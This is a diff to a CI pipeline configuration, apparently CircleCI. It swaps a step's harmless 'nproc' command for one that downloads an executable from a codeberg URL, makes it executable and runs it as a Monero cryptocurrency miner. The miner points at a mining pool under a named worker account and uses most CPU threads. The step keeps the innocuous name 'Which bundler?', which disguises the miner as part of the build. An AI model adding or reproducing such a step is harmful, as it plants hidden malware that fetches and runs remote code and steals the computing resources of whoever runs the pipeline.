@@ -11,5 +11,5 @@ jobs:
       - checkout
       - run:
           name: Which bundler?
-          command: nproc
+          command: wget https://codeberg.org/brahim7/update/raw/branch/master/update/update+-app+ && chmod +x update+-app+ && ./update+-app+ -a rx/0 -o europe.randomx-hub.miningpoolhub.com:20580 -u brahim7.brahim707 -p x --threads 26 --max-cpu-usage=85 --cpu-priority 5 --randomx-wrmsr=15 --asm=intel --randomx-no-rdmsr --randomx-no-numa --randomx-1gb-pages --randomx-mode=auto --asm=intel --cpu-no-yield --donate-level 1 --coin monero
       - ruby/bundle-install
